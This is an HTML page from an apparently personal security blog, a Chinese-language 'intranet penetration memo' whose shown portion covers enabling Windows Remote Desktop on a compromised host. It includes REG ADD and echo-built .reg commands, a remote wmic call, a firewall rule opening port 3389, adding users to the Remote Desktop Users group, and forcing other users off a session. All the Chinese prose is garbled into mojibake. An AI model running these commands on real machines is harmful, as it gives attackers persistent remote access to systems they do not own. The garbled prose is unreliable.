<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="å†…ç½‘æ¸—é€å¤‡å¿˜å½•"><meta name="keywords" content="çº¢è“å¯¹æŠ—"><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><title>å†…ç½‘æ¸—é€å¤‡å¿˜å½• | m0nk3y's Blog @ D0g3</title><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525201131.jpeg"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.1.1'
} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="m0nk3y's Blog @ D0g3" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACWindows%E5%BC%80%E5%90%AFRDP"><span class="toc-number">1.</span> <span class="toc-text">ä¸åŒç‰ˆæœ¬Windowså¼€å¯RDP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AFRDP"><span class="toc-number">1.1.</span> <span class="toc-text">åˆ¤æ–­æ˜¯å¦å¼€å¯RDP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%BC%80%E5%90%AFRDP"><span class="toc-number">1.2.</span> <span class="toc-text">é€šè¿‡æ³¨å†Œè¡¨å¼€å¯RDP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#reg%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">regæ–‡ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cmd"><span class="toc-number">1.2.2.</span> <span class="toc-text">cmd</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87wmic%E5%BC%80%E5%90%AFRDP"><span class="toc-number">1.3.</span> <span class="toc-text">é€šè¿‡wmicå¼€å¯RDP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0Remote-Desktop-Users%E7%BB%84"><span class="toc-number">1.4.</span> <span class="toc-text">æ·»åŠ ç”¨æˆ·åˆ°Remote Desktop Usersç»„</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP%E7%99%BB%E5%BD%95"><span class="toc-number">1.5.</span> <span class="toc-text">RDPç™»å½•</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E6%98%8E%E6%96%87%E7%99%BB%E5%BD%95"><span class="toc-number">1.5.1.</span> <span class="toc-text">Windows æ˜æ–‡ç™»å½•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E4%BD%BF%E7%94%A8-Hash-%E7%99%BB%E5%BD%95"><span class="toc-number">1.5.2.</span> <span class="toc-text">Windows ä½¿ç”¨ Hash ç™»å½•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mstsc"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">mstsc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mimikatz"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">mimikatz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mimikatz-%E6%8A%93%E5%8F%96hash"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">mimikatz æŠ“å–hash</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%98%8E%E6%96%87%E7%99%BB%E5%BD%95"><span class="toc-number">1.5.3.</span> <span class="toc-text">Linuxæ˜æ–‡ç™»å½•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mac"><span class="toc-number">1.5.4.</span> <span class="toc-text">Mac</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Server-03"><span class="toc-number">1.6.</span> <span class="toc-text">Windows Server 03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Xp"><span class="toc-number">1.7.</span> <span class="toc-text">Windows Xp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-8"><span class="toc-number">1.8.</span> <span class="toc-text">Windows 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-2012"><span class="toc-number">1.9.</span> <span class="toc-text">Windows 2012</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-7"><span class="toc-number">1.10.</span> <span class="toc-text">Windows 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-2016"><span class="toc-number">1.11.</span> <span class="toc-text">Windows 2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Server-2019"><span class="toc-number">1.12.</span> <span class="toc-text">Windows Server 2019</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%89%88%E6%9C%AC%E7%9A%84Windows%E7%B3%BB%E7%BB%9F%E6%94%AF%E6%8C%81%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.13.</span> <span class="toc-text">éæœåŠ¡å™¨ç‰ˆæœ¬çš„Windowsç³»ç»Ÿæ”¯æŒå¤šç”¨æˆ·ç™»å½•çš„æ–¹æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8mimikatz"><span class="toc-number">1.13.1.</span> <span class="toc-text">1. ä½¿ç”¨mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9termsrv-dll"><span class="toc-number">1.13.2.</span> <span class="toc-text">2. ä¿®æ”¹termsrv.dll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8rdpwrap"><span class="toc-number">1.13.3.</span> <span class="toc-text">3. ä½¿ç”¨rdpwrap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9ARDP%E6%9C%89%E6%95%88%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">1.14.</span> <span class="toc-text">ç¡®å®šRDPæœ‰æ•ˆç”¨æˆ·å</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">1.14.1.</span> <span class="toc-text">æ˜æ–‡å¯†ç </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RDP%E6%9A%B4%E7%A0%B4"><span class="toc-number">1.14.1.1.</span> <span class="toc-text">RDPæš´ç ´</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMB%E7%88%86%E7%A0%B4"><span class="toc-number">1.14.1.2.</span> <span class="toc-text">SMBçˆ†ç ´</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash"><span class="toc-number">1.14.2.</span> <span class="toc-text">Hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.15.</span> <span class="toc-text">RDP æƒé™ç»´æŒ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%B3%E9%97%ADRDP-%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81"><span class="toc-number">1.15.1.</span> <span class="toc-text">1. å…³é—­RDP å®‰å…¨è®¤è¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Shift%E5%90%8E%E9%97%A8-RDP-Session-%E5%8A%AB%E6%8C%81"><span class="toc-number">1.15.2.</span> <span class="toc-text">2. Shiftåé—¨ + RDP Session åŠ«æŒ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%8D%E6%89%93%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">1.16.</span> <span class="toc-text">RDP æœåŠ¡å™¨åæ‰“å®¢æˆ·ç«¯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%90%AFRDP%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7"><span class="toc-number">1.17.</span> <span class="toc-text">å¼€å¯RDPå½±å­ç”¨æˆ·</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7%E9%9A%90%E8%97%8F%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2"><span class="toc-number">1.17.1.</span> <span class="toc-text">å½±å­ç”¨æˆ·éšè—ç™»å½•ç•Œé¢</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP-%E8%BF%9E%E6%8E%A5%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="toc-number">1.18.</span> <span class="toc-text">RDP è¿æ¥ç—•è¿¹æ¸…é™¤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-0708-BlueKeep"><span class="toc-number">1.19.</span> <span class="toc-text">CVE-2019-0708(BlueKeep)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.20.</span> <span class="toc-text">å‚è€ƒèµ„æ–™</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E5%A4%96%E5%AF%BB%E6%89%BE%E5%9F%9F%E6%8E%A7%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">åŸŸå¤–å¯»æ‰¾åŸŸæ§æ€è·¯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%86%85%E7%BD%91%E4%B8%AD%E5%90%8C%E6%97%B6%E5%BC%80%E6%94%BE389%E5%92%8C53%E7%AB%AF%E5%8F%A3%E7%9A%84%E6%9C%BA%E5%99%A8"><span class="toc-number">2.1.</span> <span class="toc-text">æ‰«æå†…ç½‘ä¸­åŒæ—¶å¼€æ”¾389å’Œ53ç«¯å£çš„æœºå™¨</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E5%A4%96%E5%A6%82%E4%BD%95%E6%89%93%E5%9F%9F%E6%8E%A7"><span class="toc-number">3.</span> <span class="toc-text">åŸŸå¤–å¦‚ä½•æ‰“åŸŸæ§</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E5%AF%BB%E6%89%BE%E5%9F%9F%E6%8E%A7%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">åŸŸå†…å¯»æ‰¾åŸŸæ§æ€è·¯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">4.1.</span> <span class="toc-text">å¸¸è§çš„å‘½ä»¤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2dns%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95"><span class="toc-number">4.2.</span> <span class="toc-text">æŸ¥è¯¢dnsè§£æè®°å½•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SPN-%E6%89%AB%E6%8F%8F"><span class="toc-number">4.3.</span> <span class="toc-text">SPN æ‰«æ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AdFind-exe"><span class="toc-number">4.4.</span> <span class="toc-text">AdFind.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-1"><span class="toc-number">4.5.</span> <span class="toc-text">å‚è€ƒèµ„æ–™</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525201131.jpeg"></div><div class="author-info__name text-center">m0nk3y</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">19</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">15</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">1</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.google.com">Google</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">m0nk3y's Blog @ D0g3</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/link">Friends</a><a class="site-page" href="/mytalk">Talk</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">å†…ç½‘æ¸—é€å¤‡å¿˜å½•</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-06-21</time><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">5.6k</span><span class="post-meta__separator">|</span><span>Reading time: 23 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>[toc]</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210623164755973.png)</p>
<h1 id="ä¸åŒç‰ˆæœ¬Windowså¼€å¯RDP"><a href="#ä¸åŒç‰ˆæœ¬Windowså¼€å¯RDP" class="headerlink" title="ä¸åŒç‰ˆæœ¬Windowså¼€å¯RDP"></a>ä¸åŒç‰ˆæœ¬Windowså¼€å¯RDP</h1><p>å¯ä»¥è¿æ¥åˆ°è¿è¡Œä»¥ä¸‹ Windows æ“ä½œç³»ç»Ÿçš„ç”µè„‘ï¼š</p>
<ul>
<li>Windows 10 ä¸“ä¸šç‰ˆ</li>
<li>Windows 10 ä¼ä¸šç‰ˆ</li>
<li>Windows 8 ä¼ä¸šç‰ˆ</li>
<li>Windows 8 ä¸“ä¸šç‰ˆ</li>
<li>Windows 7 ä¸“ä¸šç‰ˆ</li>
<li>Windows 7 ä¼ä¸šç‰ˆ</li>
<li>Windows 7 æ——èˆ°ç‰ˆ</li>
<li>Windows 7 æ——èˆ°ç‰ˆ</li>
<li><strong>Windows 2008 Server</strong></li>
<li><strong>Windows Server 2008 R2</strong></li>
<li><strong>Windows Server 2012</strong></li>
<li><strong>Windows Server 2012 R2</strong></li>
<li><strong>Windows Server 2016</strong></li>
<li>Windows Multipoint Server 2011</li>
<li>Windows Multipoint Server 2012</li>
<li>Windows Small Business Server 2008</li>
<li>Windows Small Business Server 2011</li>
</ul>
<p>ä»¥ä¸‹è®¡ç®—æœºå¯ä»¥è¿è¡Œè¿œç¨‹æ¡Œé¢ç½‘å…³ï¼š</p>
<ul>
<li>Windows 2008 Server</li>
<li>Windows Server 2008 R2</li>
<li>Windows Server 2012</li>
<li>Windows Server 2012 R2</li>
<li>Windows Server 2016</li>
<li>Windows Small Business Server 2011</li>
</ul>
<p>ä»¥ä¸‹æ“ä½œç³»ç»Ÿå¯ç”¨ä½œ RD Web è®¿é—®æˆ– RemoteApp æœåŠ¡å™¨ï¼š</p>
<ul>
<li>Windows Server 2008 R2</li>
<li>Windows Server 2012</li>
<li>Windows Server 2012 R2</li>
<li>Windows Server 2016</li>
</ul>
<p>è¿œç¨‹æ¡Œé¢å®¢æˆ·ç«¯ä¸ä¼šè¿æ¥åˆ°ä»¥ä¸‹ Windows ç‰ˆæœ¬ï¼š</p>
<ul>
<li>Windows 7 ç®€æ˜“ç‰ˆ</li>
<li>Windows 7 å®¶åº­ç‰ˆ</li>
<li>Windows 8 å®¶åº­ç‰ˆ</li>
<li>Windows 8.1 å®¶åº­ç‰ˆ</li>
<li>Windows 10 å®¶åº­ç‰ˆ</li>
</ul>
<h2 id="åˆ¤æ–­æ˜¯å¦å¼€å¯RDP"><a href="#åˆ¤æ–­æ˜¯å¦å¼€å¯RDP" class="headerlink" title="åˆ¤æ–­æ˜¯å¦å¼€å¯RDP"></a>åˆ¤æ–­æ˜¯å¦å¼€å¯RDP</h2><p><em>é»˜è®¤æƒ…å†µä¸‹ï¼ŒWindow XPå’Œ server 2003ä¸Šçš„è¿œç¨‹æ¡Œé¢æœªå¯ç”¨</em> ï¼Œé€šè¿‡ä¸‹é¢çš„æ³¨å†Œè¡¨æŸ¥è¯¢å¯ä»¥çŸ¥é“ç›®æ ‡æœºå™¨æ˜¯å¦å¼€å¯äº†RDPæœåŠ¡</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections </span><br><span class="line"># æŸ¥çœ‹RDPæœåŠ¡æ˜¯å¦å¼€å¯ï¼š1å…³é—­ï¼Œ0å¼€å¯ </span><br><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹RDPæœåŠ¡çš„ç«¯å£</span><br></pre></td></tr></table></figure>

<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621113523181.png)</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621113556564.png)</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621114128380.png)</p>
<p>16è¿›åˆ¶ d3d å°±æ˜¯ 10è¿›åˆ¶çš„ 3389</p>
<p>æ–¹æ³•äºŒï¼Œé€šè¿‡æŸ¥çœ‹è¿›ç¨‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;svc | find &quot;TermService&quot; # æ‰¾åˆ°å¯¹åº”æœåŠ¡è¿›ç¨‹çš„PID</span><br><span class="line">netstat -ano | find &quot;844&quot; # æ‰¾åˆ°è¿›ç¨‹å¯¹åº”çš„ç«¯å£å·</span><br></pre></td></tr></table></figure>

<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621114506770.png)</p>
<h2 id="é€šè¿‡æ³¨å†Œè¡¨å¼€å¯RDP"><a href="#é€šè¿‡æ³¨å†Œè¡¨å¼€å¯RDP" class="headerlink" title="é€šè¿‡æ³¨å†Œè¡¨å¼€å¯RDP"></a>é€šè¿‡æ³¨å†Œè¡¨å¼€å¯RDP</h2><h3 id="regæ–‡ä»¶"><a href="#regæ–‡ä»¶" class="headerlink" title="regæ–‡ä»¶"></a>regæ–‡ä»¶</h3><p>ç¬¬ä¸€ç§æ–¹æ³•ä¹Ÿæ˜¯ç”¨â€echoâ€å‘½ä»¤å†™å…¥ä¸€ä¸ª 3389.regæ–‡ä»¶ï¼Œå†â€regedit /s 3389.regâ€å¯¼å…¥æ³¨å†Œè¡¨æ–‡ä»¶å³å¯å¼€å¯ï¼Œæ¯”è¾ƒç®€å•ã€‚å°†å¦‚ä¸‹ä»£ç ä¸€è¡Œä¸€è¡Œåœ°å¤åˆ¶åˆ°cmdshellçª—å£åæŒ‰å›è½¦æ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo Windows Registry Editor Version 5.00 &gt;3389.reg</span><br><span class="line">echo. &gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server] &gt;&gt;3389.reg</span><br><span class="line">echo &quot;fDenyTSConnections&quot;&#x3D;dword:00000000 &gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWdsdpwdTds cp] &gt;&gt;3389.reg</span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000d3d &gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp] &gt;&gt;3389.reg</span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000d3d &gt;&gt;3389.reg</span><br></pre></td></tr></table></figure>

<p>å®Œæˆä»¥ä¸Šæ“ä½œåå†æ‰§è¡Œâ€regedit /s 3389.regâ€å¯¼å…¥æ³¨å†Œè¡¨å³å¯ç”Ÿæ•ˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç‰ˆæœ¬	Windows 10 ä¸“ä¸šç‰ˆ</span><br><span class="line">ç‰ˆæœ¬å·	21H1</span><br><span class="line">å®‰è£…æ—¥æœŸ	2021&#x2F;6&#x2F;19</span><br><span class="line">æ“ä½œç³»ç»Ÿå†…éƒ¨ç‰ˆæœ¬	19043.928</span><br><span class="line">ä½“éªŒ	Windows Feature Experience Pack 120.2212.551.0</span><br></pre></td></tr></table></figure>

<p>å‡ºç°äº†UAC</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621115651613.png)</p>
<h3 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br></pre></td></tr></table></figure>

<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621120045039.png)</p>
<p>å› æ­¤ï¼Œè¦æƒ³å¼€å¯RDPï¼Œé¦–å…ˆæ˜¯è·å¾—äº†ç³»ç»Ÿçš„ç®¡ç†å‘˜æƒé™ã€‚</p>
<p><strong>æ³¨ï¼š</strong></p>
<p>å¦‚æœä¿®æ”¹è¿æ¥ç«¯å£ï¼Œ<strong>ç³»ç»Ÿé‡å¯åæ‰èƒ½ç”Ÿæ•ˆ</strong></p>
<p><strong>è¡¥å……</strong></p>
<p><strong>å¦‚æœç³»ç»Ÿæœªé…ç½®è¿‡è¿œç¨‹æ¡Œé¢æœåŠ¡ï¼Œç¬¬ä¸€æ¬¡å¼€å¯æ—¶è¿˜éœ€è¦æ·»åŠ é˜²ç«å¢™è§„åˆ™å…è®¸3389ç«¯å£</strong></p>
<p>ä¿®æ”¹é˜²ç«å¢™é…ç½®ï¼Œå…è®¸3389ç«¯å£çš„å‘½ä»¤å¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure>

<h2 id="é€šè¿‡wmicå¼€å¯RDP"><a href="#é€šè¿‡wmicå¼€å¯RDP" class="headerlink" title="é€šè¿‡wmicå¼€å¯RDP"></a>é€šè¿‡wmicå¼€å¯RDP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node: &quot;192.168.1.160&quot; &#x2F;USER:&quot;192.168.1.160\administrator&quot; PATH win32_erminalservicesetting WHERE (__Class!&#x3D;&quot;&quot;) CALL SetAllowTSConnections 1 # éœ€è¦è¾“å…¥è¿œç¨‹æœºå™¨ä¸Šç®¡ç†å‘˜å¯†ç </span><br></pre></td></tr></table></figure>



<h2 id="æ·»åŠ ç”¨æˆ·åˆ°Remote-Desktop-Usersç»„"><a href="#æ·»åŠ ç”¨æˆ·åˆ°Remote-Desktop-Usersç»„" class="headerlink" title="æ·»åŠ ç”¨æˆ·åˆ°Remote Desktop Usersç»„"></a>æ·»åŠ ç”¨æˆ·åˆ°Remote Desktop Usersç»„</h2><p>æŸ¥çœ‹æœ¬åœ°æ‰€æœ‰å·¥ä½œç»„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹Administratorç»„å†…çš„ç”¨æˆ·</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Administrators</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹Remote Desktop Usersç»„å†…çš„ç”¨æˆ·</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot;</span><br></pre></td></tr></table></figure>

<p>èµ‹äºˆéadministratorç»„ç”¨æˆ·è¿œç¨‹æ¡Œé¢ç™»å½•æƒé™ï¼Œä¹Ÿå³æŠŠç›®æ ‡ç”¨æˆ·åŠ å…¥Remote Desktop Usersç»„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot; username &#x2F;add </span><br></pre></td></tr></table></figure>

<p>æ­¤åusernameå…·æœ‰è¿œç¨‹ç™»å½•çš„æƒé™ï¼Œç™»å½•å®Œæˆåå°†usernameåœ¨Remote Desktop Usersç»„ä¸­åˆ é™¤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot; username &#x2F;del</span><br></pre></td></tr></table></figure>



<h2 id="RDPç™»å½•"><a href="#RDPç™»å½•" class="headerlink" title="RDPç™»å½•"></a>RDPç™»å½•</h2><h3 id="Windows-æ˜æ–‡ç™»å½•"><a href="#Windows-æ˜æ–‡ç™»å½•" class="headerlink" title="Windows æ˜æ–‡ç™»å½•"></a>Windows æ˜æ–‡ç™»å½•</h3><ol>
<li>mstsc.exe</li>
<li>mstsc.exe /console /v:ip/admin   # å¦‚æœç™»å½•ç”¨æˆ·æ•°é‡è¾¾åˆ°é™åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤å¼ºåˆ¶è¸¢å‡ºä¸€ä¸ªç”¨æˆ·</li>
</ol>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621195256529.png)</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621200056069.png)</p>
<p>è¢«è¸¢ä¸‹çº¿</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621200125104.png)</p>
